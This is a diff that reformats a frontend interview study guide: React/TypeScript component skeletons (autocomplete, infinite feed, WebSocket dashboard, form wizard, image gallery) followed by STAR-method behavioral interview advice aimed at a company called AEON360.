 3. API returns â†’ `results` populated, `loading` = false
@@ -2218,6 +2383,7 @@ type SearchState = {
 #### Step 4: Identify Performance & Accessibility Concerns (3 minutes)
 
 **Performance checklist:**
+
 - [ ] Debounce/throttle frequent events (input, scroll, resize)
 - [ ] Memoize expensive computations (`useMemo`)
 - [ ] Memoize callbacks passed to children (`useCallback`)
@@ -2226,6 +2392,7 @@ type SearchState = {
 - [ ] Cancel in-flight requests on unmount (`AbortController`)
 
 **Accessibility checklist:**
+
 - [ ] Semantic HTML (`<button>` not `<div onClick>`)
 - [ ] Keyboard navigation (Tab, Enter, Esc, arrow keys)
 - [ ] ARIA roles and labels (`role="listbox"`, `aria-label`)
@@ -2235,11 +2402,13 @@ type SearchState = {
 #### Step 5: Discuss Testing & Edge Cases (2 minutes)
 
 **Testing strategy:**
+
 - Unit tests: Pure functions (validation, formatters, utils)
 - Integration tests: Component with mocked API (React Testing Library)
 - E2E tests: Full user flow (Cypress, Playwright)
 
 **Edge cases to mention:**
+
 - Empty states (no results, no data)
 - Error states (network failure, 500 error, timeout)
 - Loading states (skeleton vs spinner)
@@ -2299,10 +2468,10 @@ type AutocompleteState = {
 **Code Skeleton:**
 
 ```tsx
-import { useState, useEffect, useRef } from 'react';
+import { useState, useEffect, useRef } from "react";
 
 function AutocompleteSearch() {
-  const [query, setQuery] = useState('');
+  const [query, setQuery] = useState("");
   const [suggestions, setSuggestions] = useState<Suggestion[]>([]);
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState<Error | null>(null);
@@ -2335,12 +2504,12 @@ function AutocompleteSearch() {
         const res = await fetch(`/api/search?q=${encodeURIComponent(query)}`, {
           signal: controller.signal,
         });
-        if (!res.ok) throw new Error('Search failed');
+        if (!res.ok) throw new Error("Search failed");
         const data = await res.json();
         setSuggestions(data.results.slice(0, 10));
         setIsOpen(true);
       } catch (err: any) {
-        if (err.name !== 'AbortError') {
+        if (err.name !== "AbortError") {
           setError(err);
         }
       } finally {
@@ -2359,22 +2528,22 @@ function AutocompleteSearch() {
     if (!isOpen) return;
 
     switch (e.key) {
-      case 'ArrowDown':
+      case "ArrowDown":
         e.preventDefault();
-        setSelectedIndex(prev => Math.min(prev + 1, suggestions.length - 1));
+        setSelectedIndex((prev) => Math.min(prev + 1, suggestions.length - 1));
         break;
-      case 'ArrowUp':
+      case "ArrowUp":
         e.preventDefault();
-        setSelectedIndex(prev => Math.max(prev - 1, -1));
+        setSelectedIndex((prev) => Math.max(prev - 1, -1));
         break;
-      case 'Enter':
+      case "Enter":
         if (selectedIndex >= 0) {
           e.preventDefault();
           // Navigate to selected suggestion
-          window.location.href = suggestions[selectedIndex].url || '#';
+          window.location.href = suggestions[selectedIndex].url || "#";
         }
         break;
-      case 'Escape':
+      case "Escape":
         setIsOpen(false);
         setSelectedIndex(-1);
         break;
@@ -2386,7 +2555,7 @@ function AutocompleteSearch() {
       <input
         type="text"
         value={query}
-        onChange={e => setQuery(e.target.value)}
+        onChange={(e) => setQuery(e.target.value)}
         onKeyDown={handleKeyDown}
         placeholder="Search..."
         role="combobox"
@@ -2408,8 +2577,8 @@ function AutocompleteSearch() {
               id={`suggestion-${idx}`}
               role="option"
               aria-selected={idx === selectedIndex}
-              className={idx === selectedIndex ? 'selected' : ''}
-              onClick={() => (window.location.href = s.url || '#')}
+              className={idx === selectedIndex ? "selected" : ""}
+              onClick={() => (window.location.href = s.url || "#")}
             >
               {s.label}
             </li>
@@ -2418,8 +2587,13 @@ function AutocompleteSearch() {
       )}
 
       {/* Screen reader announcements */}
-      <div role="status" aria-live="polite" aria-atomic="true" className="sr-only">
-        {loading && 'Loading results'}
+      <div
+        role="status"
+        aria-live="polite"
+        aria-atomic="true"
+        className="sr-only"
+      >
+        {loading && "Loading results"}
         {suggestions.length > 0 && `${suggestions.length} results available`}
       </div>
     </div>
@@ -2428,12 +2602,14 @@ function AutocompleteSearch() {
 ```
 
 **Performance Considerations:**
+
 - âœ… Debounced at 300ms â€” avoids spamming API on every keystroke
 - âœ… `AbortController` cancels in-flight requests â€” prevents race conditions
 - âœ… Memoization not needed here (no expensive computations)
 - âš ï¸ Could add caching with a `Map<query, results>` if users frequently backspace
 
 **Accessibility Highlights:**
+
 - `role="combobox"` on input, `role="listbox"` on suggestions
 - `aria-expanded`, `aria-controls`, `aria-activedescendant` for screen readers
 - Keyboard navigation (â†‘â†“ arrows, Enter, Esc)
@@ -2501,7 +2677,7 @@ type FeedState = {
 **Code Skeleton:**
 
 ```tsx
-import { useState, useEffect, useRef } from 'react';
+import { useState, useEffect, useRef } from "react";
 
 function InfiniteFeed() {
   const [posts, setPosts] = useState<Post[]>([]);
@@ -2522,12 +2698,12 @@ function InfiniteFeed() {
     if (!sentinelRef.current) return;
 
     observerRef.current = new IntersectionObserver(
-      entries => {
+      (entries) => {
         if (entries[0].isIntersecting && !loading && nextCursor) {
           fetchPosts();
         }
       },
-      { threshold: 1.0 }
+      { threshold: 1.0 },
     );
 
     observerRef.current.observe(sentinelRef.current);
@@ -2540,14 +2716,12 @@ function InfiniteFeed() {
     setError(null);
 
     try {
-      const url = nextCursor
-        ? `/api/feed?cursor=${nextCursor}`
-        : '/api/feed';
+      const url = nextCursor ? `/api/feed?cursor=${nextCursor}` : "/api/feed";
       const res = await fetch(url);
-      if (!res.ok) throw new Error('Failed to load posts');
+      if (!res.ok) throw new Error("Failed to load posts");
 
       const data = await res.json();
-      setPosts(prev => [...prev, ...data.posts]);
+      setPosts((prev) => [...prev, ...data.posts]);
       setNextCursor(data.nextCursor);
     } catch (err: any) {
       setError(err);
@@ -2559,38 +2733,41 @@ function InfiniteFeed() {
   // Optimistic like
   async function handleLike(postId: string) {
     // 1. Update UI immediately
-    setPosts(prev =>
-      prev.map(p =>
+    setPosts((prev) =>
+      prev.map((p) =>
         p.id === postId
           ? { ...p, likedByUser: true, likeCount: p.likeCount + 1 }
-          : p
-      )
+          : p,
+      ),
     );
 
     try {
       // 2. Send to API
-      const res = await fetch(`/api/posts/${postId}/like`, { method: 'POST' });
-      if (!res.ok) throw new Error('Like failed');
+      const res = await fetch(`/api/posts/${postId}/like`, { method: "POST" });
+      if (!res.ok) throw new Error("Like failed");
     } catch (err) {
       // 3. Rollback on failure
-      setPosts(prev =>
-        prev.map(p =>
+      setPosts((prev) =>
+        prev.map((p) =>
           p.id === postId
             ? { ...p, likedByUser: false, likeCount: p.likeCount - 1 }
-            : p
-        )
+            : p,
+        ),
       );
-      alert('Failed to like post');
+      alert("Failed to like post");
     }
   }
 
   return (
     <div className="feed">
-      {posts.map(post => (
+      {posts.map((post) => (
         <div key={post.id} className="post">
           <p>{post.content}</p>
-          <button onClick={() => handleLike(post.id)} disabled={post.likedByUser}>
-            {post.likedByUser ? 'â¤ï¸' : 'ðŸ¤'} {post.likeCount}
+          <button
+            onClick={() => handleLike(post.id)}
+            disabled={post.likedByUser}
+          >
+            {post.likedByUser ? "â¤ï¸" : "ðŸ¤"} {post.likeCount}
           </button>
         </div>
       ))}
@@ -2607,11 +2784,13 @@ function InfiniteFeed() {
 ```
 
 **Performance Considerations:**
+
 - âœ… Intersection Observer triggers fetch when sentinel is visible (native, efficient)
 - âš ï¸ No virtualization â€” fine for <500 posts, but at 1000+ posts, consider `react-window`
 - âœ… Cursor-based pagination avoids "page drift" (new posts shifting offset indices)
 
 **Optimistic Update Pattern:**
+
 1. Update local state immediately (instant feedback)
 2. Send API request in background
 3. Rollback if API fails (with user notification)
@@ -2667,25 +2846,27 @@ type Metric = {
 
 type DashboardState = {
   metrics: Metric[];
-  connectionStatus: 'connected' | 'polling' | 'disconnected';
+  connectionStatus: "connected" | "polling" | "disconnected";
   lastUpdate: Date | null;
 };
 
 // WebSocket message types (discriminated union)
 type WSMessage =
-  | { type: 'metrics_update'; data: Metric[] }
-  | { type: 'ping' }
-  | { type: 'error'; message: string };
+  | { type: "metrics_update"; data: Metric[] }
+  | { type: "ping" }
+  | { type: "error"; message: string };
 ```
 
 **Code Skeleton:**
 
 ```tsx
-import { useState, useEffect, useRef } from 'react';
+import { useState, useEffect, useRef } from "react";
 
 function Dashboard() {
   const [metrics, setMetrics] = useState<Metric[]>([]);
-  const [connectionStatus, setConnectionStatus] = useState<'connected' | 'polling' | 'disconnected'>('disconnected');
+  const [connectionStatus, setConnectionStatus] = useState<
+    "connected" | "polling" | "disconnected"
+  >("disconnected");
   const [lastUpdate, setLastUpdate] = useState<Date | null>(null);
 
   const wsRef = useRef<WebSocket | null>(null);
@@ -2707,12 +2888,12 @@ function Dashboard() {
   }, []);
 
   function connectWebSocket() {
-    const ws = new WebSocket('wss://api.example.com/metrics');
+    const ws = new WebSocket("wss://api.example.com/metrics");
     wsRef.current = ws;
 
     ws.onopen = () => {
-      console.log('WebSocket connected');
-      setConnectionStatus('connected');
+      console.log("WebSocket connected");
+      setConnectionStatus("connected");
       reconnectAttemptsRef.current = 0;
       // Stop polling if it was running
       if (pollingTimerRef.current) {
@@ -2724,22 +2905,22 @@ function Dashboard() {
     ws.onmessage = (event) => {
       const message: WSMessage = JSON.parse(event.data);
 
-      if (message.type === 'metrics_update') {
+      if (message.type === "metrics_update") {
         setMetrics(message.data);
         setLastUpdate(new Date());
-      } else if (message.type === 'error') {
-        console.error('WebSocket error:', message.message);
+      } else if (message.type === "error") {
+        console.error("WebSocket error:", message.message);
       }
       // Ignore ping messages
     };
 
     ws.onerror = (error) => {
-      console.error('WebSocket error:', error);
+      console.error("WebSocket error:", error);
     };
 
     ws.onclose = () => {
-      console.log('WebSocket disconnected');
-      setConnectionStatus('disconnected');
+      console.log("WebSocket disconnected");
+      setConnectionStatus("disconnected");
 
       // Exponential backoff reconnection
       const delay = Math.min(1000 * 2 ** reconnectAttemptsRef.current, 30000); // max 30s
@@ -2747,11 +2928,13 @@ function Dashboard() {
 
       setTimeout(() => {
         if (reconnectAttemptsRef.current < 5) {
-          console.log(`Reconnecting... attempt ${reconnectAttemptsRef.current}`);
+          console.log(
+            `Reconnecting... attempt ${reconnectAttemptsRef.current}`,
+          );
           connectWebSocket();
         } else {
           // After 5 failed attempts, fall back to polling
-          console.log('WebSocket reconnection failed, falling back to polling');
+          console.log("WebSocket reconnection failed, falling back to polling");
           startPolling();
         }
       }, delay);
@@ -2759,17 +2942,17 @@ function Dashboard() {
   }
 
   function startPolling() {
-    setConnectionStatus('polling');
+    setConnectionStatus("polling");
 
     pollingTimerRef.current = setInterval(async () => {
       try {
-        const res = await fetch('/api/metrics');
-        if (!res.ok) throw new Error('Polling failed');
+        const res = await fetch("/api/metrics");
+        if (!res.ok) throw new Error("Polling failed");
         const data = await res.json();
         setMetrics(data.metrics);
         setLastUpdate(new Date());
       } catch (err) {
-        console.error('Polling error:', err);
+        console.error("Polling error:", err);
       }
     }, 5000); // poll every 5 seconds
   }
@@ -2778,14 +2961,18 @@ function Dashboard() {
     <div className="dashboard">
       <div className="status-bar">
         Status: <strong>{connectionStatus}</strong>
-        {lastUpdate && <span> Â· Last update: {lastUpdate.toLocaleTimeString()}</span>}
+        {lastUpdate && (
+          <span> Â· Last update: {lastUpdate.toLocaleTimeString()}</span>
+        )}
       </div>
 
       <div className="metrics-grid">
-        {metrics.map(metric => (
+        {metrics.map((metric) => (
           <div key={metric.id} className="metric-card">
             <h3>{metric.label}</h3>
-            <p className="value">{metric.value} {metric.unit}</p>
+            <p className="value">
+              {metric.value} {metric.unit}
+            </p>
           </div>
         ))}
       </div>
@@ -2795,11 +2982,13 @@ function Dashboard() {
 ```
 
 **Performance Considerations:**
+
 - âœ… WebSocket is more efficient than polling (push vs pull)
 - âœ… Exponential backoff prevents reconnection spam
 - âš ï¸ If updates arrive every 100ms, throttle state updates to avoid 10 re-renders/sec
 
 **WebSocket Lifecycle:**
+
 1. **Open** â†’ Set status to `connected`, clear polling timer
 2. **Message** â†’ Parse, update state
 3. **Error** â†’ Log, wait for close event
@@ -2880,17 +3069,17 @@ type WizardState = {
 **Code Skeleton (simplified):**
 
 ```tsx
-import { useState, useEffect } from 'react';
-import { z } from 'zod'; // for validation schemas
+import { useState, useEffect } from "react";
+import { z } from "zod"; // for validation schemas
 
 // Validation schemas
 const step1Schema = z.object({
-  name: z.string().min(2, 'Name must be at least 2 characters'),
-  email: z.string().email('Invalid email'),
-  phone: z.string().regex(/^\d{10}$/, 'Phone must be 10 digits'),
+  name: z.string().min(2, "Name must be at least 2 characters"),
+  email: z.string().email("Invalid email"),
+  phone: z.string().regex(/^\d{10}$/, "Phone must be 10 digits"),
 });
 
-const STORAGE_KEY = 'form-wizard-draft';
+const STORAGE_KEY = "form-wizard-draft";
 
 function FormWizard() {
   const [currentStep, setCurrentStep] = useState<1 | 2 | 3>(1);
@@ -2905,14 +3094,14 @@ function FormWizard() {
   useEffect(() => {
     const timer = setTimeout(() => {
       localStorage.setItem(STORAGE_KEY, JSON.stringify(formData));
-      console.log('Draft saved');
+      console.log("Draft saved");
     }, 1000);
 
     return () => clearTimeout(timer);
   }, [formData]);
 
   function updateField(step: keyof FormData, field: string, value: string) {
-    setFormData(prev => ({
+    setFormData((prev) => ({
       ...prev,
       [step]: { ...prev[step], [field]: value },
     }));
@@ -2930,7 +3119,7 @@ function FormWizard() {
     } catch (err: any) {
       if (err instanceof z.ZodError) {
         const fieldErrors: ValidationErrors = {};
-        err.errors.forEach(e => {
+        err.errors.forEach((e) => {
           fieldErrors[e.path[0] as string] = e.message;
         });
         setErrors(fieldErrors);
@@ -2941,31 +3130,31 @@ function FormWizard() {
 
   function handleNext() {
     if (validateStep(currentStep)) {
-      setCurrentStep(prev => Math.min(prev + 1, 3) as 1 | 2 | 3);
+      setCurrentStep((prev) => Math.min(prev + 1, 3) as 1 | 2 | 3);
     }
   }
 
   function handleBack() {
-    setCurrentStep(prev => Math.max(prev - 1, 1) as 1 | 2 | 3);
+    setCurrentStep((prev) => Math.max(prev - 1, 1) as 1 | 2 | 3);
   }
 
   async function handleSubmit() {
     if (!validateStep(3)) return;
 
     try {
-      const res = await fetch('/api/submit', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+      const res = await fetch("/api/submit", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify(formData),
       });
 
-      if (!res.ok) throw new Error('Submission failed');
+      if (!res.ok) throw new Error("Submission failed");
 
       // Clear draft on success
       localStorage.removeItem(STORAGE_KEY);
-      alert('Form submitted successfully!');
+      alert("Form submitted successfully!");
     } catch (err) {
-      alert('Submission failed. Please try again.');
+      alert("Submission failed. Please try again.");
     }
   }
 
@@ -2977,8 +3166,8 @@ function FormWizard() {
         <div>
           <h2>Personal Info</h2>
           <input
-            value={formData.step1.name || ''}
-            onChange={e => updateField('step1', 'name', e.target.value)}
+            value={formData.step1.name || ""}
+            onChange={(e) => updateField("step1", "name", e.target.value)}
             placeholder="Name"
           />
           {errors.name && <p className="error">{errors.name}</p>}
@@ -2999,11 +3188,13 @@ function FormWizard() {
 ```
 
 **Performance Considerations:**
+
 - âœ… Debounced auto-save avoids spamming localStorage on every keystroke
 - âœ… Zod validation is fast for typical forms (<100 fields)
 - âš ï¸ If form has dozens of fields, consider splitting schemas into separate modules
 
 **State Management Trade-offs:**
+
 - **Local state (useState)** â€” simple, no boilerplate. Good for this case.
 - **URL params** â€” shareable links, but leaks sensitive data (credit card) in URL. Not suitable here.
 - **Context** â€” useful if wizard is deeply nested; overkill for flat structure.
@@ -3068,25 +3259,25 @@ type GalleryState = {
 **Code Skeleton:**
 
 ```tsx
-import { useState, useEffect, useRef } from 'react';
-import { useSearchParams } from 'react-router-dom'; // or Next.js router
+import { useState, useEffect, useRef } from "react";
+import { useSearchParams } from "react-router-dom"; // or Next.js router
 
 function Gallery() {
   const [images, setImages] = useState<Image[]>([]);
   const [loadedImageIds, setLoadedImageIds] = useState<Set<string>>(new Set());
   const [searchParams, setSearchParams] = useSearchParams();
 
-  const selectedCategory = searchParams.get('category');
+  const selectedCategory = searchParams.get("category");
 
   useEffect(() => {
     // Fetch all images once
-    fetch('/api/images')
-      .then(res => res.json())
-      .then(data => setImages(data.images));
+    fetch("/api/images")
+      .then((res) => res.json())
+      .then((data) => setImages(data.images));
   }, []);
 
   const filteredImages = selectedCategory
-    ? images.filter(img => img.category === selectedCategory)
+    ? images.filter((img) => img.category === selectedCategory)
     : images;
 
   function handleCategoryClick(cat: string | null) {
@@ -3100,18 +3291,18 @@ function Gallery() {
   return (
     <div className="gallery">
       <FilterBar
-        categories={['Nature', 'People', 'Food', 'Tech']}
+        categories={["Nature", "People", "Food", "Tech"]}
         selectedCategory={selectedCategory}
         onCategoryClick={handleCategoryClick}
       />
 
       <div className="image-grid">
-        {filteredImages.map(img => (
+        {filteredImages.map((img) => (
           <LazyImage
             key={img.id}
             image={img}
             onLoad={() =>
-              setLoadedImageIds(prev => new Set(prev).add(img.id))
+              setLoadedImageIds((prev) => new Set(prev).add(img.id))
             }
             isLoaded={loadedImageIds.has(img.id)}
           />
@@ -3141,13 +3332,13 @@ function LazyImage({
     if (!imgRef.current) return;
 
     const observer = new IntersectionObserver(
-      entries => {
+      (entries) => {
         if (entries[0].isIntersecting) {
           setIsVisible(true);
           observer.disconnect(); // stop observing once visible
         }
       },
-      { threshold: 0.1 }
+      { threshold: 0.1 },
     );
 
     observer.observe(imgRef.current);
@@ -3163,7 +3354,7 @@ function LazyImage({
           src={image.url}
           alt={image.alt}
           onLoad={onLoad}
-          style={{ display: isLoaded ? 'block' : 'none' }}
+          style={{ display: isLoaded ? "block" : "none" }}
         />
       )}
     </div>
@@ -3171,21 +3362,29 @@ function LazyImage({
 }
 
 function Skeleton() {
-  return <div className="skeleton" style={{ width: '100%', height: 200, background: '#ddd' }} />;
+  return (
+    <div
+      className="skeleton"
+      style={{ width: "100%", height: 200, background: "#ddd" }}
+    />
+  );
 }
 ```
 
 **Performance Considerations:**
+
 - âœ… Intersection Observer triggers image load only when in viewport
 - âœ… Client-side filtering avoids re-fetching from API (assuming dataset is small, <1000 images)
 - âš ï¸ For large datasets (10,000+ images), fetch paginated by category
 
 **URL State Sync:**
+
 - Filter state is stored in `?category=Nature` URL param
 - Benefits: shareable links, back button works, SEO-friendly
 - Trade-off: URL updates trigger navigation events (use `replace` instead of `push` to avoid history pollution)
 
 **Skeleton Screen vs Spinner:**
+
 - **Skeleton** â€” better UX for known layout (image cards)
 - **Spinner** â€” better for unknown content size (modal loading)
 
@@ -3208,15 +3407,15 @@ For **each** of the 5 examples above, be ready to discuss these trade-offs:
 
 #### When to use X over Y?
 
-| Scenario | Option X | Option Y | When to choose X |
-|---|---|---|---|
-| **State management** | `useState` | Context API | <3 levels of prop drilling, local to one component |
-| | Context API | Redux | Shared across many routes, but no complex logic |
-| | Redux | Zustand | Need devtools, middleware, time-travel debugging |
-| **Data fetching** | `useEffect` + `fetch` | React Query | Simple one-off fetch, no caching needed |
-| | React Query | SWR | Need caching, background refetch, stale-while-revalidate |
-| **Lists** | `.map()` directly | Virtualization (`react-window`) | <100 items, no scroll performance issues |
-| **Validation** | Inline checks | Zod/Yup schema | >5 fields, reusable validation, type safety |
+| Scenario             | Option X              | Option Y                        | When to choose X                                         |
+| -------------------- | --------------------- | ------------------------------- | -------------------------------------------------------- |
+| **State management** | `useState`            | Context API                     | <3 levels of prop drilling, local to one component       |
+|                      | Context API           | Redux                           | Shared across many routes, but no complex logic          |
+|                      | Redux                 | Zustand                         | Need devtools, middleware, time-travel debugging         |
+| **Data fetching**    | `useEffect` + `fetch` | React Query                     | Simple one-off fetch, no caching needed                  |
+|                      | React Query           | SWR                             | Need caching, background refetch, stale-while-revalidate |
+| **Lists**            | `.map()` directly     | Virtualization (`react-window`) | <100 items, no scroll performance issues                 |
+| **Validation**       | Inline checks         | Zod/Yup schema                  | >5 fields, reusable validation, type safety              |
 
 #### What breaks at scale?
 
@@ -3233,6 +3432,7 @@ For **each** of the 5 examples above, be ready to discuss these trade-offs:
 - **E2E tests** â€” Test full user flow (Cypress, Playwright)
 
 Example for autocomplete:
+
 1. Unit test: `debounce` function works correctly
 2. Integration test: Type "react" â†’ mock API returns results â†’ verify results render
 3. E2E test: Open app â†’ type in search â†’ select result â†’ navigate to detail page
@@ -3308,7 +3508,9 @@ dispatch(fetchUserRequest());
 ```tsx
 // Use local state or Context
 const [user, setUser] = useState(null);
-useEffect(() => { fetchUser().then(setUser); }, []);
+useEffect(() => {
+  fetchUser().then(setUser);
+}, []);
 ```
 
 **Rule:** Start simple. Add complexity only when requirements demand it (many consumers, complex async logic, time-travel debugging).
@@ -3332,6 +3534,7 @@ useEffect(() => { fetchUser().then(setUser); }, []);
 **Why:** Retrofitting a11y is expensive. Semantic HTML costs zero extra effort upfront.
 
 **Checklist to apply from day 1:**
+
 - Use semantic elements (`<button>`, `<nav>`, `<main>`)
 - Add `aria-label` for icon buttons
 - Ensure keyboard navigation works (Tab, Enter, Esc)
@@ -3402,6 +3605,7 @@ Common edge cases to always check:
 Then code the critical pieces (state management, API call, main component) on the whiteboard, narrating your reasoning.
 
 **Your goal:** Demonstrate that you can:
+
 - Break down ambiguous problems
 - Make informed trade-offs
 - Communicate clearly under pressure
@@ -3410,7 +3614,6 @@ Then code the critical pieces (state management, API call, main component) on th
 Syntax perfection doesn't matter â€” clear thinking does.
 
 ---
-
 
 ## Phase 9 â€” Behavioral Interview (STAR Method)
 
@@ -3463,6 +3666,7 @@ What was the measurable outcome? Use numbers.
 > "At my last job, we had a slow page. The team decided to optimize it. We refactored some components and it got faster. Users liked it."
 
 **Why bad:**
+
 - "We" not "I" â€” unclear what you did
 - No context (what page? how slow?)
 - No specific actions (what refactoring?)
@@ -3479,6 +3683,7 @@ What was the measurable outcome? Use numbers.
 > **Result:** Load time dropped to 1.8 seconds. LCP improved from 4.5s to 1.2s. Mobile bounce rate decreased from 25% to 12%. The change increased mobile conversions by 18%, which translated to $50K additional monthly revenue.
 
 **Why good:**
+
 - Clear context with measurable problem (6s load, 25% bounce)
 - Specific ownership ("I used Lighthouse," "I implemented")
 - Concrete actions with technical detail
@@ -3488,17 +3693,18 @@ What was the measurable outcome? Use numbers.
 
 #### Three More Examples (Side-by-Side)
 
-| Aspect | âŒ Bad | âœ… Good |
-|---|---|---|
-| **Ownership** | "The team decided to use Redux." | "I proposed Redux because we needed global state for 5+ routes. I compared it to Context API and Zustand, presented a doc with trade-offs, and got buy-in from the team." |
-| **Handling failure** | "A bug happened and we fixed it." | "I deployed a change that broke checkout for 15 minutes. I immediately rolled back, investigated the root cause (a missing null check), added tests to catch it, and implemented a staging environment checklist." |
-| **Collaboration** | "I worked with design." | "The designer wanted a complex animation that would hurt performance. I built a prototype showing the FPS drop, proposed a simpler alternative, and we A/B tested both. The simpler version had 10% better engagement, so we shipped that." |
+| Aspect               | âŒ Bad                            | âœ… Good                                                                                                                                                                                                                                    |
+| -------------------- | --------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **Ownership**        | "The team decided to use Redux."  | "I proposed Redux because we needed global state for 5+ routes. I compared it to Context API and Zustand, presented a doc with trade-offs, and got buy-in from the team."                                                                   |
+| **Handling failure** | "A bug happened and we fixed it." | "I deployed a change that broke checkout for 15 minutes. I immediately rolled back, investigated the root cause (a missing null check), added tests to catch it, and implemented a staging environment checklist."                          |
+| **Collaboration**    | "I worked with design."           | "The designer wanted a complex animation that would hurt performance. I built a prototype showing the FPS drop, proposed a simpler alternative, and we A/B tested both. The simpler version had 10% better engagement, so we shipped that." |
 
 ---
 
 ### 9.2 Five Core Question Categories
 
 For each category below, you'll find:
+
 1. Common question phrasings
 2. What the interviewer is testing
 3. A story template to fill out
@@ -3509,11 +3715,13 @@ For each category below, you'll find:
 #### Category 1: Technical Conflict Resolution
 
 **Common questions:**
+
 - "Tell me about a time you disagreed with a teammate on a technical approach."
 - "Describe a situation where you had to convince someone to change their design."
 - "How do you handle code review feedback you disagree with?"
 
 **What they're testing:**
+
 - Can you disagree respectfully?
 - Do you back your opinions with data?
 - Can you compromise or escalate when needed?
@@ -3533,11 +3741,13 @@ For each category below, you'll find:
 > "We shipped [approach] on time. [Measurable outcome, e.g., performance improved by X%, no bugs in production, team learned something new]."
 
 **Red flags to avoid:**
+
 - âŒ "They were wrong, I was right" (arrogance)
 - âŒ "I just did what they said even though I disagreed" (no ownership)
 - âŒ Blaming the other person ("They didn't listen")
 
 **AEON360-specific angle:**
+
 - AEON works on client projects (Odoo, ERP integrations). Mention balancing **client requests vs technical best practices**.
 - Example: "Client wanted feature X in 2 days, but I knew it would create tech debt. I proposed a phased approach: MVP in 2 days, full solution in 2 weeks. Client agreed after I showed a Figma mockup of both versions."
 
@@ -3546,11 +3756,13 @@ For each category below, you'll find:
 #### Category 2: Ownership & Driving Projects
 
 **Common questions:**
+
 - "Tell me about a project you led from idea to production."
 - "Describe a time you took initiative without being asked."
 - "Give an example of a project you drove that had significant impact."
 
 **What they're testing:**
+
 - Do you wait for instructions or proactively solve problems?
 - Can you see projects through from start to finish?
 - Do you think about business impact, not just technical execution?
@@ -3570,11 +3782,13 @@ For each category below, you'll find:
 > "[Metric improved by X% / saved Y hours per week / increased revenue by $Z]. The project is now [maintained by the team / part of the core product]."
 
 **Red flags to avoid:**
+
 - âŒ "I did everything myself" (no collaboration)
 - âŒ "It was mostly done, I just finished it" (not true ownership)
 - âŒ No measurable result ("it went well")
 
 **AEON360-specific angle:**
+
 - AEON emphasizes **Agile** and **client collaboration**. Mention:
   - Running sprint planning, backlog refinement
   - Balancing multiple client projects
@@ -3587,11 +3801,13 @@ Example: "I noticed our Odoo integration module had no automated tests, causing 
 #### Category 3: Handling Failure & Learning
 
 **Common questions:**
+
 - "Tell me about a time you failed."
 - "Describe a bug you caused that impacted users. How did you handle it?"
 - "What's the biggest mistake you made and what did you learn?"
 
 **What they're testing:**
+
 - Can you admit mistakes without deflecting blame?
 - Do you learn from failure?
 - How do you handle pressure and recover?
@@ -3611,11 +3827,13 @@ Example: "I noticed our Odoo integration module had no automated tests, causing 
 > "The issue was resolved in [X minutes]. We implemented [new process] and haven't had that issue since. I learned to [specific lesson, e.g., always test with production data, never skip staging]."
 
 **Red flags to avoid:**
+
 - âŒ Blaming others ("PM gave me wrong requirements")
 - âŒ Downplaying impact ("It wasn't a big deal")
 - âŒ No learning ("It just happened")
 
 **AEON360-specific angle:**
+
 - Mention **incident response** and **client communication**.
 - Example: "I pushed a change that broke the Odoo invoice generation for a client. I immediately rolled back, notified the client within 10 minutes, and had a fix ready in 30 minutes. I added a pre-deploy checklist and a staging environment smoke test. Client appreciated the transparency and we kept the contract."
 
@@ -3624,11 +3842,13 @@ Example: "I noticed our Odoo integration module had no automated tests, causing 
 #### Category 4: Cross-Functional Collaboration
 
 **Common questions:**
+
 - "Describe a time you worked with a designer/PM/backend engineer when requirements were unclear."
 - "Tell me about a time you had to explain a technical concept to a non-technical stakeholder."
 - "How do you handle feedback from design that conflicts with technical constraints?"
 
 **What they're testing:**
+
 - Can you translate between technical and non-technical language?
 - Do you respect other disciplines (design, product, backend)?
 - Can you find solutions when requirements are ambiguous?
@@ -3648,11 +3868,13 @@ Example: "I noticed our Odoo integration module had no automated tests, causing 
 > "We shipped on time. [User feedback was positive / feature met business goal / team learned to collaborate better on future projects]."
 
 **Red flags to avoid:**
+
 - âŒ "Design didn't understand technical constraints" (dismissive)
 - âŒ "I just built what they asked" (no critical thinking)
 - âŒ "I ignored their feedback" (poor collaboration)
 
 **AEON360-specific angle:**
+
 - AEON works directly with clients (banking, insurance, government). Emphasize:
   - **Client education** (explaining technical trade-offs in business terms)
   - **Agile ceremonies** (sprint reviews, demos to clients)
@@ -3665,11 +3887,13 @@ Example: "A banking client wanted real-time transaction updates, but their legac
 #### Category 5: Adapting to Changing Requirements
 
 **Common questions:**
+
 - "Tell me about a time requirements changed mid-project. How did you adapt?"
 - "Describe a situation where you had to pivot your approach."
 - "How do you handle scope creep?"
 
 **What they're testing:**
+
 - Are you flexible or rigid?
 - Can you re-prioritize under pressure?
 - Do you push back on unrealistic changes or just accept everything?
@@ -3689,11 +3913,13 @@ Example: "A banking client wanted real-time transaction updates, but their legac
 > "We delivered [on time / slightly delayed but with full scope / MVP first, rest later]. [Client was satisfied / team avoided burnout / learned to set better expectations upfront]."
 
 **Red flags to avoid:**
+
 - âŒ "I just worked nights and weekends" (unsustainable, no negotiation)
 - âŒ "I said no and refused" (inflexible)
 - âŒ "We missed the deadline" with no explanation of mitigation
 
 **AEON360-specific angle:**
+
 - AEON's 4-phase methodology (**Cadrage â†’ Conception â†’ DÃ©veloppement â†’ Livraison**) likely has built-in checkpoints.
 - Example: "During the Conception phase, the client added 3 new modules to the Odoo integration. I updated the PRD, flagged the impact on timeline (+2 sprints), and proposed deferring one module to Phase 2. Client agreed, and we delivered core functionality on time."
 
@@ -3705,21 +3931,22 @@ Example: "A banking client wanted real-time transaction updates, but their legac
 
 You can reuse the same story for multiple questions if you frame it differently.
 
-| Category | Project Name | S (Situation - 15s) | T (Task - 15s) | A (Action - 60s) | R (Result - 30s) |
-|----------|--------------|---------------------|----------------|------------------|------------------|
-| **Technical Conflict** | ________________ | Brief context of disagreement | Your goal | What you did to resolve | Measurable outcome |
-| **Ownership & Initiative** | ________________ | Problem you identified | What you decided to do | How you drove it | Impact (metrics) |
-| **Handling Failure** | ________________ | What went wrong | Your responsibility | How you fixed + learned | Recovery + prevention |
-| **Cross-Functional Collab** | ________________ | Who you worked with, what was unclear | What you needed to achieve | How you collaborated | Outcome for project |
-| **Adapting to Change** | ________________ | What changed mid-project | Challenge this created | How you adapted | Final result |
+| Category                    | Project Name         | S (Situation - 15s)                   | T (Task - 15s)             | A (Action - 60s)        | R (Result - 30s)      |
